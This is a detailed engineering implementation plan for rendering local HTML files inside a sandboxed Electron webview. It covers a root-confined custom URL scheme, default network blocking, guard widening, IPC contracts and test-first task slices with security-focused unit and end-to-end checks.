# HTML document viewing — implementation plan

**Spec:** `docs/specs/2026-09-18-html-document-viewing.md` (revision 2)  **Tier:** FULL

## Goal

An `.html`/`.htm` file opens as the **rendered page** — its own CSS, images and scripts working,
the network blocked until allowed — inside a hardened `<webview>` guest served by a new
root-confined `conduit-preview:` scheme, with a rendered⇄source toggle, find-in-page, a working
right-click menu and a keyboard way out, reachable from the Explorer, the tab menu, the palette
and `Mod+Shift+H`.

## Architecture

Five layers, bottom-up.

**(1) `src/preview-url.ts`** — pure path⇄URL mapping. Platform-explicit (derives the volume form
from the path's *shape*, never `process.platform`, because CI runs `verify` on ubuntu-latest) and
**node-builtin-free**: the renderer imports it, and the renderer bundle is `platform: 'browser'`
with no shims (`esbuild.mjs:29-37`). Plain string logic, no `node:path`.

**(2) `electron/preview-protocol.ts`** — scheme registration, the session handler, the network
filter and the precheck. The **only** place confinement is enforced: `isInsideAnyRoot` **and**
`realPathLeaf`, the pair `fs-dnd`/`fs-import` use — `isInsideAnyRoot` alone is lexical and catches
`../..` but not a symlink escape.

**(3) `electron/main.ts`** — pre-ready scheme registration, post-`writeRoots` handler
registration, and four guest behaviours Electron gives guests *no* default for: a session-aware
nav guard, a `context-menu` handler, a `before-input-event` Escape path, and a window-open
handler.

**(4) `webview/html-view-store.ts`** — a module singleton in the `review-nav-store.ts` shape
holding each doc's view mode, reload nonce and network-allow flag, so the chrome, the menus, the
palette and the keybinding all drive one state. A local `useState` (what Markdown uses) cannot be
reached by a menu or a keybinding, so the store is what makes "a whole variety of places"
possible at all.

**(5) `webview/components/html-viewer.tsx`** — the viewer and its states.

No sketches were made: every seam mirrors a precedent named in Contracts.

## Data flow

```
Explorer row / palette / tab menu / Markdown link / Mod+Shift+H
  └─ app.tsx openFile(path) ──► docs reducer ──► DocView (doc-view.tsx)
        ├─ isHtmlDocPath(doc.path)?   (src/media-kind.ts — EXTENSION, never language==='html')
        │     no → PdfViewer / MarkdownViewer / CodeViewer     (unchanged ladder)
        └─ yes → <HtmlViewer>
              ├─ useHtmlView(doc.id, settings.htmlDefaultView) ──► webview/html-view-store.ts
              │        ◄── setHtmlView · bumpHtmlReload · allowNetwork   (chrome · menu · palette · key)
              ├─ view==='source' → <div class="viewer inkbox"> "View rendered" + <CodeViewer>
              └─ view==='preview'
                    ├─ post html:canPreview(path) ──────────────────► HOST
                    │     ◄── { ok:false, reason } → the matching §8 state; NO src is ever set
                    │     ◄── { ok:true }
                    └─ previewUrlForPath(path) → <webview partition="conduit-preview" src=…>
                           │  doc.content changes → capture scrollY → reload() → restore scrollY
                           ▼
   MAIN PROCESS
     module scope (BEFORE app.ready — required, or the URL is not hierarchical and relative
       resolution, the whole point of the URL shape, silently fails):
         protocol.registerSchemesAsPrivileged([{ scheme:'conduit-preview', privileges:{
           standard:true, secure:true, supportFetchAPI:true, stream:true, corsEnabled:false }}])
     whenReady, AFTER writeRoots exists (main.ts:3207):
         const ses = session.fromPartition('conduit-preview')          // in-memory, not persist:
         ses.protocol.handle('conduit-preview', …)
              1. pathForPreviewUrl(url)                          → null   ⇒ 404
              2. isInsideAnyRoot(abs, roots())
                 && isInsideAnyRoot(realPathLeaf(abs), roots())  → false  ⇒ 404  ◄ THE confinement
              3. stat: missing | dir ⇒ 404 · size > 8 MB ⇒ 413
              4. Response(bytes, content-type, x-content-type-options: nosniff)   · read err ⇒ 500
         ses.webRequest.onBeforeRequest(…)
              conduit-preview: → allow.  anything else → CANCEL + notify the renderer
              (unless that tab has been allowed)                        ◄ THE network policy
     ipcMain 'html:canPreview' → previewVerdict(...) → { ok } | { ok:false, reason }
     will-attach-webview:   allow = isHttpUrl(src) || isPreviewUrl(src)
     web-contents-created, for a guest whose session IS the preview session:
         will-navigate      : preview URL → allow · http(s) → deny + openExternalUrl
         setWindowOpenHandler: preview URL → loadURL in place · http(s) → openExternalUrl
         context-menu       : forward params to the renderer, which opens Conduit's menu
         before-input-event : Escape → tell the renderer to focus the viewer chrome
```

## Settled decisions — do not re-litigate

- `conduit-preview:` + `<webview>` is the transport. Not `file://` (moves confinement to the
  renderer); not sanitized inline HTML (strips scripts, cannot resolve relative assets, and the
  CSP has no `frame-src`).
- Confinement is enforced in the **main process** only.
- Scripts run; the **network is blocked by default** with a per-tab allow. The pair is what makes
  "scripts run" defensible (spec §13).
- HTML document-ness is the **extension** `/\.html?$/i`. `language === 'html'` also matches
  `.vue`/`.svelte` (`src/lang.ts:19-22`).
- One label everywhere: **`Open externally`**. `shell.openPath` opens the OS-default app for
  `.html`, often an editor — "Open in default browser" is a promise the code cannot keep.
- The editor-tab menu's frozen close-family-first order is **not** amended; the new rows go where
  `Open in browser` already sits.
- Only the **active** HTML doc's guest stays mounted. `web` docs stay warm by design
  (`center-pane.tsx:309-318`); a preview guest is an OS process per tab.
- The viewer chrome mirrors Markdown's: `.viewer` / `.viewer__controls` / `.viewer__toggle`, and
  the source branch re-inks with `viewer inkbox` (`markdown-viewer.tsx:924-950`).
- The view choice **survives a tab switch**, where Markdown's does not (`markdown-viewer.tsx:530`
  is a local `useState` and `center-pane.tsx:358` keys `DocView` on the doc id). Forced by the
  entry points needing to reach the state; still ephemeral — nothing is persisted, and the entry
  is dropped on doc close.

## Spec staleness

Every §2 claim was measured before the spec was written; none measured false. Two facts grounding
this plan added, both now folded into the spec:

- **The renderer bundle takes no node builtins.** `esbuild.mjs:29-37` is `platform: 'browser'`
  with no `external` and no shims. Measured: every current renderer import of a node-touching
  `src/` module is `import type` only, and `out/webview.js` contains zero `node:path`/`node:fs`.
  So `src/preview-url.ts` must be plain-string (INV-6). A review finding claimed the constraint
  was `tsconfig.webview.json`'s `include` list instead; that was measured false — the renderer
  already imports ~30 `src/*` modules absent from it and typecheck is green.
- `writeRoots` lives **inside** the `whenReady` closure (`main.ts:3207-3212`), so the handler
  takes a `getRoots` callback; only the scheme registration sits at module scope.

## Global constraints

- **Gate:** `npm run verify`. Exit code read directly, never through a pipe or pager. Baseline
  green at `f00a90c`.
- **E2E:** `node test/e2e/run-smoke.mjs <scenario>` — real Electron, hidden, **serial**. Every
  scenario opens with the suite's `process.platform !== 'win32'` skip guard.
- **Guest assertions go through the main process** — `app.evaluate` →
  `webContents.getAllWebContents()` → the `getType() === 'webview'` entry → `executeJavaScript`.
  Proven by spike (run report). Asserting from the host DOM would pass against a guest that
  rendered nothing.
- **Two tsconfigs**; `npm run typecheck` runs both.
- **No `process.platform`** may decide behavior in `src/preview-url.ts` or its test.
- Comments explain **why** only; a decision already in the spec or ADR gets a one-line pointer
  (`// see ADR 0005 §2`), never a re-explanation.
- No band-aids: no `!important`, no specificity escalation, no `as any`/`@ts-ignore`, and
  **never** `webSecurity:false` / `allowFileAccessFromFileURLs` / `file://`.
- Naming: `kebab-case.ts`; `camelCase` functions; `SCREAMING_SNAKE` module constants;
  `PascalCase` components. Pure logic in `src/`, renderer glue in `webview/`, host in `electron/`.
- Every new pure module gets `test/unit/<name>.test.ts`.

## Out of scope

Zoom, print/export, HTML diff preview, watching sub-resources, UNC, `.xhtml`, opening HTML into
the existing `web` tab, and any change to `http(s)` browser-tab behaviour.

## Contracts

### `src/preview-url.ts` (new, pure, **no node builtins**)

```ts
export const PREVIEW_SCHEME = 'conduit-preview';
export type PathShape = 'drive' | 'unc' | 'posix' | 'relative';
export function pathShape(p: string): PathShape;
/** Absolute path → preview URL. null for 'unc' | 'relative'. */
export function previewUrlForPath(absPath: string): string | null;
/** Preview URL → absolute path. null when not a well-formed preview URL. */
export function pathForPreviewUrl(url: string): string | null;
/** True when `src` parses as a preview URL — the guard's allow test. */
export function isPreviewUrl(src: string): boolean;
/** Extension → Content-Type. Unknown → 'application/octet-stream'. */
export function previewContentType(pathOrExt: string): string;
```
**Mapping.** drive `G:\a b\r.html` → `conduit-preview://g/a%20b/r.html` (host = lowercased drive
letter; each segment `encodeURIComponent`). posix `/a/r.html` →
`conduit-preview://localhost/a/r.html`. unc/relative → `null`. **Decode:** host `localhost` →
`/` + decoded segments; host = one ASCII letter → `<LETTER>:\` + segments joined with `\`; any
other host → `null`. **INV-3:** canonical round-trip, not identity.

### `electron/preview-protocol.ts` (new, host)

```ts
export const PREVIEW_PARTITION = 'conduit-preview';
export const MAX_PREVIEW_BYTES = 8 * 1024 * 1024;

/** MUST run at module scope, before app ready. */
export function registerPreviewScheme(): void;

export type PreviewReason = 'blocked' | 'too-large' | 'missing' | 'unsupported' | 'unreadable';
export type PreviewVerdict =
  | { ok: true; path: string; contentType: string }
  | { ok: false; reason: PreviewReason; status: 404 | 413 | 500; detail?: string };

/** The whole decision, pure and injected so it needs no filesystem and no Electron. */
export function previewVerdict(
  url: string,
  roots: readonly string[],
  stat: (p: string) => { isFile: boolean; size: number } | null,
  realPath: (p: string) => string,
): PreviewVerdict;

/** Same decision keyed by PATH rather than URL — what `html:canPreview` answers. */
export function previewVerdictForPath(
  absPath: string,
  roots: readonly string[],
  stat: (p: string) => { isFile: boolean; size: number } | null,
  realPath: (p: string) => string,
): PreviewVerdict;

/** Should the preview session let this request through? Pure. */
export function allowPreviewRequest(url: string, networkAllowed: boolean): boolean;

/** Wire the handler + the request filter onto `ses`. `getRoots` is called PER REQUEST —
 *  roots change as sessions open and close, so a snapshot goes stale. */
export function registerPreviewProtocol(
  ses: Session,
  getRoots: () => string[],
  isNetworkAllowed: () => boolean,
  onBlocked: (host: string) => void,
): void;
```

### `src/webview-guard.ts` (modify)

```ts
/** http(s) for any guest, plus conduit-preview, which only the preview session can serve. */
export function isAllowedGuestUrl(url: string): boolean;                    // new
export function hardenWebviewPrefs(p: MutableWebPreferences, src: string): { allow: boolean };
// body: allow = isHttpUrl(src) || isPreviewUrl(src); the hardening lines are UNCHANGED
```

### `src/media-kind.ts` (modify)

```ts
/** True for `.html`/`.htm`, case-insensitive. Deliberately NOT `language === 'html'`,
 *  which src/lang.ts also assigns to .vue and .svelte. */
export function isHtmlDocPath(filePath: string): boolean;
```

### `src/protocol.ts` (modify — the IPC seam)

```ts
// WebviewToHost
| { type: 'html:canPreview'; requestId: string; path: string }
| { type: 'html:setNetworkAllowed'; docId: string; allowed: boolean }
| { type: 'html:contextMenuAction'; action: 'copy' | 'selectAll' | 'copyLink' | 'openLink'
                                          | 'find' | 'reload' | 'viewSource'; linkURL?: string }
// HostToWebview
| { type: 'html:canPreviewResult'; requestId: string;
    result: { ok: true } | { ok: false; reason: PreviewReason; detail?: string } }
| { type: 'html:networkBlocked'; host: string }
| { type: 'html:contextMenu'; x: number; y: number; hasSelection: boolean; linkURL?: string }
| { type: 'html:escape' }
```

### `webview/html-view-store.ts` (new)

```ts
export type HtmlView = 'preview' | 'source';
export function getHtmlView(docId: string, fallback: HtmlView): HtmlView;
export function setHtmlView(docId: string, view: HtmlView): void;
export function toggleHtmlView(docId: string, fallback: HtmlView): HtmlView;
export function bumpHtmlReload(docId: string): void;
export function getHtmlReload(docId: string): number;
export function isNetworkAllowed(docId: string): boolean;
export function setNetworkAllowed(docId: string, allowed: boolean): void;
/** Drop a closed doc's entry — called from app.tsx's doc-close path. */
export function clearHtmlView(docId: string): void;
export function subscribeHtmlView(cb: () => void): () => void;
```

### `webview/html-menu.ts` (new, pure — the guest context menu)

```ts
export interface HtmlMenuContext { hasSelection: boolean; linkURL?: string }
export type HtmlMenuAction =
  | 'copy' | 'selectAll' | 'copyLink' | 'openLink' | 'find' | 'reload' | 'viewSource';
export interface HtmlMenuItemSpec {
  id: string; label: string; action: HtmlMenuAction;
  disabled?: boolean; separatorBefore?: boolean;
}
export function buildHtmlMenuItems(ctx: HtmlMenuContext): HtmlMenuItemSpec[];
```
Content-menu idiom (not the object taxonomy), mirroring `webview/markdown-menu.ts`:
`Copy` · `Select all` — `Copy link address` · `Open link externally` (only with a `linkURL`) —
`Find…` — `Reload` · `View source`.

### `webview/components/html-viewer.tsx` (new)

```tsx
export function HtmlViewer(props: {
  doc: FileContentDTO;
  docId: string;
  fallbackView: HtmlView;
  dirty: boolean;
  onOpenExternally: (path: string) => void;
  onSave: () => void;
}): JSX.Element;
```

### `src/settings.ts` (modify)

```ts
export type HtmlDefaultView = 'preview' | 'source';
// AppSettings:       htmlDefaultView: HtmlDefaultView;
// DEFAULT_SETTINGS:  htmlDefaultView: 'preview',
const HTML_DEFAULT_VIEWS = ['preview', 'source'] as const;   // beside RIGHT_PANE_TABS (:246)
// coerceSettings:    oneOf('htmlDefaultView', HTML_DEFAULT_VIEWS)
```

## Producer/consumer map

| Behavior changed | Produced by | Consumed by | Sides touched |
|---|---|---|---|
| `conduit-preview://` bytes | the session handler | the preview guest | both |
| Scheme registration | module-scope `registerPreviewScheme` | Chromium's URL parser, the handler, `webSecurity` | both |
| Path⇄URL mapping | `src/preview-url.ts` | handler, viewer, guard | both |
| Precheck verdict | host `html:canPreview` | the viewer's state selection | both |
| Blocked-request event | the preview session's request filter | the viewer's allow-bar | both |
| Guest context-menu event | host `context-menu` on preview guests | `webview/html-menu.ts` → `ContextMenu` | both |
| Guest Escape | host `before-input-event` | the viewer's focus call | both |
| Webview attach verdict | `hardenWebviewPrefs` | `main.ts:979-985` — its **only** caller (recursive search, hidden dirs included) | both |
| Guest navigation verdict | `web-contents-created` `will-navigate` (`main.ts:3507-3509`) | every guest, **incl. browser tabs** | both — hence session-aware, not globally widened; `web-view.e2e.mjs` re-asserts the browser tab unchanged |
| Doc render decision | `doc-view.tsx:92-95` | the doc pane | both |
| `.docpage` treatment | `doc-view.tsx:35` | `.docpanel` + `styles.css:3482` | both |
| `isHtmlFile` predicate | was `app.tsx:161` (local) | tab menu `app.tsx:1844-1852`, palette `app.tsx:2544-2553` — **no third caller** | both; the local copy is **deleted** |
| View mode / reload nonce / allow flag | `webview/html-view-store.ts` | viewer, tab menu, palette, shortcut | both |
| Open-file change | `open-file-watcher.ts` → `fileChanged` → `app.tsx:314-317` | **new consumer:** the viewer's reload | **consumer only** — the producer is unchanged and needs no new guarantee; measured, an open `file` doc is already watched and re-read. Its limit (only doc paths are watched, `app.tsx:961-970`, so sub-resources are missed) is a **scoped-out flow recorded in spec §13**, not an oversight |
| `htmlDefaultView` | `settings-modal.tsx` → `coerceSettings` → userData | `doc-view.tsx` → viewer fallback | both |
| `toggleHtmlView` action | `webview/shortcuts.ts` | settings keymap UI + window key handler | both |

## File map

| Path | Action | Responsibility |
|---|---|---|
| `src/preview-url.ts` | create | Pure, node-free path⇄URL mapping + content types |
| `test/unit/preview-url.test.ts` | create | Round-trip, encoding, shape refusal, content types |
| `src/media-kind.ts` | modify | `isHtmlDocPath` |
| `test/unit/media-kind.test.ts` | modify | `.html`/`.htm` yes; `.vue`/`.svelte`/`.xhtml`/no-ext no |
| `src/webview-guard.ts` | modify | Widen by one scheme; add `isAllowedGuestUrl` |
| `test/unit/webview-guard.test.ts` | modify | New allowlist pinned explicitly |
| `electron/preview-protocol.ts` | create | Scheme, handler, request filter, precheck; pure `previewVerdict*` / `allowPreviewRequest` |
| `test/unit/preview-verdict.test.ts` | create | Confinement, symlink escape, cap, missing, dir, network filter |
| `src/protocol.ts` | modify | The five new IPC messages |
| `electron/main.ts` | modify | Pre-ready registration; handler + filter in `whenReady`; session-aware nav guard; guest context-menu, Escape and window-open handlers; the `html:canPreview` / `html:setNetworkAllowed` cases |
| `src/settings.ts` | modify | `htmlDefaultView` |
| `test/unit/coerce-settings.test.ts` | modify | Unknown value falls back to `'preview'` |
| `webview/appearance-sections.ts` | modify | The control id in the `editor` section |
| `test/unit/appearance-sections.test.ts` | modify | Listed exactly once |
| `webview/components/settings-modal.tsx` | modify | The `htmlDefaultView` `SelectField` case |
| `webview/html-view-store.ts` | create | Per-doc view mode, reload nonce, network-allow flag |
| `test/unit/html-view-store.test.ts` | create | Fallback, toggle, bump, allow, clear, notify-once |
| `webview/html-menu.ts` | create | Pure builder for the guest context menu |
| `test/unit/html-menu.test.ts` | create | Items, link-only rows, selection gating |
| `webview/components/html-viewer.tsx` | create | The viewer, its chrome, its states |
| `webview/components/doc-view.tsx` | modify | The `isHtmlDocPath` branch + `.docpage` |
| `webview/styles.css` | modify | `.htmlview*` frame, allow-bar, notice states |
| `webview/explorer-menu.tsx` | modify | `Open preview` + `Open source` in group 1 |
| `test/unit/explorer-menu.test.ts` | modify | Present for `.html`, absent otherwise, disabled at N>1 |
| `webview/shortcuts.ts` | modify | `toggleHtmlView`, `Mod+Shift+H`, group `Editor` |
| `webview/app.tsx` | modify | Delete local `isHtmlFile`; tab-menu rows; palette; shortcut; IPC handlers; `clearHtmlView` |
| `test/e2e/html-viewer.e2e.mjs` | create | The real-app check for slices 3 and 4 |
| `test/e2e/context-menu-order.e2e.mjs` | modify | The new expected HTML-tab order |
| `docs/adr/0005-local-html-preview-scheme.md` | create | The widened invariant, where it will not archive |
| `CHANGELOG.md` | modify | User-facing entry |
| `CLAUDE.md` | modify | One bullet: the webview is no longer http(s)-only |
| `docs/specs/2026-09-18-html-document-viewing.md` | modify | `status: implemented` |

## Scripts

**None.** No routine repeats more than a handful of times — one scheme, one handler, one viewer,
five menu/palette sites. A script would cost more than it saves. Stated deliberately.

## Slices

### Slice 1: Pure foundations

**Check:** `npx vitest run test/unit/preview-url.test.ts test/unit/media-kind.test.ts
test/unit/webview-guard.test.ts` exits 0, and `npm run typecheck` passes both projects.

**Parallel groups:** G1: T1.1 · G2: T1.2 · Serial: T1.3 (consumes T1.1)
**Claims (serial lane):** none — all three files are new or single-owner.

#### Task 1.1: `src/preview-url.ts`

**Files:** Create `src/preview-url.ts`; Test `test/unit/preview-url.test.ts`
**Produces:** `PREVIEW_SCHEME`, `PathShape`, `pathShape`, `previewUrlForPath`,
`pathForPreviewUrl`, `isPreviewUrl`, `previewContentType` — signatures under Contracts.

**Steps:**
- [ ] Failing test: `'round-trips a canonical Windows drive path'` — key assertion:
      `pathForPreviewUrl(previewUrlForPath('G:\\awby\\r.html')) === 'G:\\awby\\r.html'`
- [ ] Failing test: `'normalises a lower-case drive letter rather than round-tripping it'` — key
      assertion: `pathForPreviewUrl(previewUrlForPath('g:\\a\\r.html')) === 'G:\\a\\r.html'`
      (INV-3 is canonical, not identity — the URL host is case-folded)
- [ ] Failing test: `'percent-encodes spaces, #, ? and non-ASCII per segment'` — key assertion:
      the URL for `G:\a b\ré#1?.html` contains `%20`, `%23`, `%3F`, no raw `#`/`?`, and
      round-trips exactly
- [ ] Failing test: `'refuses UNC and relative paths'` — key assertion: both `=== null`
- [ ] Failing test: `'maps a posix absolute path through the localhost host'` — key assertion:
      `previewUrlForPath('/home/u/r.html') === 'conduit-preview://localhost/home/u/r.html'`
- [ ] Failing test: `'rejects a foreign scheme and a multi-letter host'` — key assertion:
      `isPreviewUrl('file:///a') === false`, `pathForPreviewUrl('conduit-preview://gg/a') === null`
- [ ] Failing test: `'content types cover html, css, js, mjs, json, svg, png, woff2 and fall back'`
      — key assertion: `previewContentType('a.mjs') === 'text/javascript'`,
      `previewContentType('a.zzz') === 'application/octet-stream'`
- [ ] Run `npx vitest run test/unit/preview-url.test.ts` — expect FAIL (module missing)
- [ ] Implement with **plain string logic**. No `node:path`, no `node:fs`, no `process.platform`
      — INV-6 and INV-2. A WHY comment says the renderer bundle is browser-platform with no shims

#### Task 1.2: `isHtmlDocPath`

**Files:** Modify `src/media-kind.ts` (beside `pdfKindForPath`, its sibling in role);
Modify `test/unit/media-kind.test.ts`
**Produces:** `isHtmlDocPath(filePath: string): boolean`

**Steps:**
- [ ] Failing test: `'treats .html and .htm as documents, case-insensitively'` — key assertion:
      `isHtmlDocPath('a.HTML') && isHtmlDocPath('a.htm')`
- [ ] Failing test: `'does not treat .vue, .svelte, .xhtml or an extension-less file as one'` —
      key assertion: all four `=== false`. This is the guard for INV-5
- [ ] Run `npx vitest run test/unit/media-kind.test.ts` — expect FAIL (export missing)
- [ ] Implement with a WHY comment naming the `language === 'html'` trap

#### Task 1.3: Widen the webview guard (serial — consumes T1.1)

**Files:** Modify `src/webview-guard.ts` (the `allow` line, a new `isAllowedGuestUrl`, and the
header comment, which currently states http(s)-only as *the* rule);
Modify `test/unit/webview-guard.test.ts`
**Consumes:** `isPreviewUrl(src: string): boolean` from `src/preview-url.ts`
**Produces:** `isAllowedGuestUrl(url: string): boolean`; `hardenWebviewPrefs` unchanged in shape
**Call sites:** `electron/main.ts:979-985` only. Task 2.2 owns that file.

**Steps:**
- [ ] Failing test: `'allows a conduit-preview src to attach'` — key assertion:
      `hardenWebviewPrefs({}, 'conduit-preview://g/a/r.html').allow === true`
- [ ] Failing test: `'still refuses file:, data: and javascript:'` — all three `allow === false`
- [ ] Failing test: `'hardens a preview guest identically to an http one'` — key assertion: the
      resulting prefs object deep-equals the http case (preload deleted, sandbox true, …)
- [ ] Run `npx vitest run test/unit/webview-guard.test.ts` — expect FAIL (preview refused)
- [ ] Implement; the header states the widened rule and **links ADR 0005** rather than
      re-explaining it

---

### Slice 2: The host transport

**Check:** `npx vitest run test/unit/preview-verdict.test.ts` exits 0; `npm run typecheck` passes
both projects; `node test/e2e/run-smoke.mjs web-view` stays green — the existing browser tab must
be untouched by the widened guard. The scheme has no renderer consumer yet, so this slice's seam
is the host contract plus a non-regression proof; it is checked further in Slice 3.

**Parallel groups:** G1: T2.1 · Serial: T2.2
**Claims (serial lane):** `electron/main.ts`, `src/protocol.ts`

#### Task 2.1: `electron/preview-protocol.ts`

**Files:** Create `electron/preview-protocol.ts`; Test `test/unit/preview-verdict.test.ts`
**Consumes:** `pathForPreviewUrl(url: string): string | null`,
`previewContentType(pathOrExt: string): string`, `PREVIEW_SCHEME`, `isPreviewUrl(src: string):
boolean` from `src/preview-url.ts`; `isInsideAnyRoot(child: string, roots: readonly string[]):
boolean` (`src/path-guard.ts:42`) and `realPathLeaf(target: string): string`
(`src/path-guard.ts:53`).
**Produces:** the exports under Contracts.

**Steps:**
- [ ] Failing test: `'serves a file inside a root'` — key assertion: `.ok === true` and
      `.contentType === 'text/html'`
- [ ] Failing test: `'refuses a path outside every root'` — key assertion:
      `reason === 'blocked' && status === 404`
- [ ] Failing test: `'refuses a path whose REAL path escapes the root'` — key assertion: a `stat`
      resolving inside but a `realPath` returning an outside path still yields `blocked`. This is
      why both checks run; `isInsideAnyRoot` alone is lexical and would pass
- [ ] Failing test: `'refuses a directory and a missing file'` — `reason === 'missing'`
- [ ] Failing test: `'refuses a file over the cap'` — key assertion: `reason === 'too-large'` at
      `MAX_PREVIEW_BYTES + 1`, `ok` at exactly `MAX_PREVIEW_BYTES`
- [ ] Failing test: `'refuses a non-preview URL'` — `reason === 'unsupported'`
- [ ] Failing test: `'the request filter passes preview URLs and cancels everything else until
      allowed'` — key assertion: `allowPreviewRequest('https://cdn.example/x.js', false) === false`
      and `=== true` once allowed; `allowPreviewRequest('conduit-preview://g/a.css', false) === true`
- [ ] Run `npx vitest run test/unit/preview-verdict.test.ts` — expect FAIL (module missing)
- [ ] Implement. `previewVerdict*` and `allowPreviewRequest` are **pure with injected
      `stat`/`realPath`**, so the test touches no filesystem and needs no Electron;
      `registerPreviewProtocol` is the thin wrapper supplying `fs`-backed versions, calling
      `getRoots()` **per request**, and setting `content-type` + `x-content-type-options: nosniff`

#### Task 2.2: Wire the host (serial — owns `electron/main.ts` and `src/protocol.ts`)

**Files:** Modify `src/protocol.ts` (the five messages under Contracts); Modify `electron/main.ts`
**Consumes:** `registerPreviewScheme(): void`, `registerPreviewProtocol(ses, getRoots,
isNetworkAllowed, onBlocked): void`, `previewVerdictForPath(absPath, roots, stat, realPath):
PreviewVerdict`, `PREVIEW_PARTITION` from `electron/preview-protocol.ts`; `isHttpUrl(src: string):
boolean`, `isAllowedGuestUrl(url: string): boolean` from `src/webview-guard.ts`;
`isPreviewUrl(src: string): boolean` from `src/preview-url.ts`.

**Steps:**
- [ ] `registerPreviewScheme()` at module scope beside the GPU switches (`main.ts:257-258`).
      **It must run before `app.whenReady`** or Electron throws
- [ ] Inside `whenReady`, after `writeRoots` exists (`main.ts:3207-3212`):
      `const previewSession = session.fromPartition(PREVIEW_PARTITION)` then
      `registerPreviewProtocol(previewSession, writeRoots, () => networkAllowedForActivePreview(), (host) => sendToRenderer({ type: `html:networkBlocked`, host }))`. Pass `writeRoots` **as a
      callback** — roots change as sessions open and close
- [ ] Add the `html:canPreview` and `html:setNetworkAllowed` cases beside the existing `md:image`
      case (`main.ts:2117-2143`), which is the precedent for a content-triggered, root-confined
      host read
- [ ] Guest `will-navigate` (`main.ts:3507-3509`) becomes **session-aware**: `isHttpUrl(url)`
      allowed for any guest; `isPreviewUrl(url)` allowed **only** when
      `contents.session === previewSession`; for a preview guest an `http(s)` navigation is
      denied and handed to `openExternalUrl`. A globally widened guard would let a browsed page
      navigate to a preview URL — it would fail for lack of a handler, but failing closed at the
      guard is the honest boundary
- [ ] Preview guests get their **own** `setWindowOpenHandler`: a `conduit-preview:` target loads
      in place, `http(s)` goes to `openExternalUrl`. Without this a `target="_blank"` to a sibling
      local page hits the app-wide handler, whose allowlist is http/https/mailto/tel/sms/facetime
      (`main.ts:857-867`), and **dies silently**
- [ ] Preview guests get a `context-menu` handler forwarding `{x, y, hasSelection, linkURL}` to
      the renderer, and a `before-input-event` handler sending `html:escape` on Escape. Electron
      guests have neither by default
- [ ] Run `npm run typecheck` (both projects) and `node test/e2e/run-smoke.mjs web-view`

---

### Slice 3: The viewer renders

**Check:** `npx vitest run test/unit/html-view-store.test.ts` exits 0 and `node test/e2e/run-smoke.mjs html-viewer` passes: the guest mounts with a
`conduit-preview://` src; **inside the guest** the heading's computed colour is the one
`./assets/style.css` sets and the marker `./assets/app.js` writes is present; a `fetch` to a
remote host is blocked and the allow-bar names it; `View source` mounts Monaco and `View rendered`
brings the guest back.

**Parallel groups:** G1: T3.0, T3.1 · Serial: T3.2, T3.3, T3.4
**Claims (serial lane):** `src/settings.ts`, `webview/styles.css`, `webview/components/doc-view.tsx`

#### Task 3.0: `webview/html-view-store.ts`

**Files:** Create `webview/html-view-store.ts`; Test `test/unit/html-view-store.test.ts`
**Produces:** the nine exports under Contracts. Shape mirrors `webview/review-nav-store.ts:17-30`
(module-level `Set<Listener>`, notify on change, no-op when unchanged).

**Steps:**
- [ ] Failing test: `'an unset doc reports the fallback'` — key assertion:
      `getHtmlView('file:a.html', 'preview') === 'preview'`
- [ ] Failing test: `'toggle flips from the fallback then from the stored value'` — key
      assertion: successive calls return `'source'` then `'preview'`
- [ ] Failing test: `'setting an unchanged value does not notify'` — key assertion: subscriber
      call count unchanged
- [ ] Failing test: `'bumpHtmlReload increments per doc and notifies'`
- [ ] Failing test: `'network allow is per doc and defaults to false'`
- [ ] Failing test: `'clearHtmlView drops the entry so the fallback applies again'`
- [ ] Run `npx vitest run test/unit/html-view-store.test.ts` — expect FAIL (module missing)
- [ ] Implement DOM-free (the React hook lives in the viewer) so it is node-testable

#### Task 3.1: The `htmlDefaultView` setting

**Files:** Modify `src/settings.ts`, `test/unit/coerce-settings.test.ts`,
`webview/appearance-sections.ts` (the `editor` section's `controls`, `:61-63`),
`test/unit/appearance-sections.test.ts`, `webview/components/settings-modal.tsx` (a new `case`
modelled on `editorChangeMarkers` at `:496-507`, rendering a **`SelectField`** — a bare `<select>`
is what the overlay-layers spec removed)
**Produces:** `HtmlDefaultView`, `AppSettings['htmlDefaultView']`

**Steps:**
- [ ] Failing test: `'htmlDefaultView defaults to preview and rejects an unknown value'` — key
      assertion: `coerceSettings({ htmlDefaultView: 'nope' }).htmlDefaultView === 'preview'`
- [ ] Failing test: `'the editor section lists htmlDefaultView exactly once'`
- [ ] Run `npx vitest run test/unit/coerce-settings.test.ts test/unit/appearance-sections.test.ts`
      — expect FAIL
- [ ] Implement all five edits

#### Task 3.2: `webview/components/html-viewer.tsx` (serial — owns `webview/styles.css`)

**Files:** Create `webview/components/html-viewer.tsx`; Modify `webview/styles.css` (an
`.htmlview*` block beside the `.viewer` rules at `:4889-5155`; **token references only**)
**Consumes:** `previewUrlForPath(absPath: string): string | null` from `src/preview-url.ts`;
`HtmlView`, `getHtmlView`, `setHtmlView`, `bumpHtmlReload`, `getHtmlReload`, `isNetworkAllowed`,
`setNetworkAllowed`, `subscribeHtmlView` from `webview/html-view-store.ts`..
**Produces:** `HtmlViewer` — signature under Contracts.

**Steps:**
- [ ] Source branch first: `<div className="viewer inkbox">` + a `View rendered` `.viewer__toggle`
      + `<CodeViewer doc={doc} viewStateId={\`html-source:${doc.path}\`} />` — the shape
      `markdown-viewer.tsx:924-934` uses, including the distinct `viewStateId` that keeps the two
      views' scroll positions apart
- [ ] Preview branch: `.viewer` → `.viewer__controls` (`View source` · `Reload` · `Find` ·
      `Open externally`, plus `Back` once the guest has navigated) → the
      `<webview className="htmlview__frame" partition="conduit-preview">`. **`src` is set only
      after `html:canPreview` answers `ok`**
- [ ] Mount the guest **only for the active doc** — a preview guest is an OS process per tab
- [ ] States from spec §8: precheck `reason` → blocked / not-found / too-large / unreadable;
      `previewUrlForPath` → `null` ⇒ the unsupported-location state (source shown, toggle
      `disabled` with a `title`); empty content ⇒ `<EmptyState variant="inline">` as
      `markdown-viewer.tsx:973-979`; `did-fail-load` ⇒ the error panel reusing `.webview__error*`
      from `web-view.tsx:159-173`; guest `crashed` ⇒ the crashed state; attach refusal ⇒ the
      page-level error
- [ ] Allow-bar on `html:networkBlocked`: `role="status"`, names the host, `Allow` → the store +
      `html:setNetworkAllowed` + reload; `Dismiss`; `Escape` dismisses
- [ ] Dirty notice when `props.dirty`: "Showing the saved file — you have unsaved changes." with
      `Save and reload`
- [ ] Reload effect on `[doc.content, getHtmlReload(docId)]`, skipped on first mount: capture
      `scrollY` via the guest's `executeJavaScript`, `reload()`, restore on `did-finish-load`
